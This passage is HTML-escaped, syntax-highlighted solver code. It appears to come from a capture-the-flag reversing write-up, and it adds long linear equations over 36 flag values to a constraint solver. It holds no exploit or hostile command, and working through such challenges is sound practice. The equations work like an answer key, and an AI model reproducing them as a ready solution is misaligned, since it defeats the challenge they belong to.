style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41387&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30463&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;14435&lt;/span&gt;)
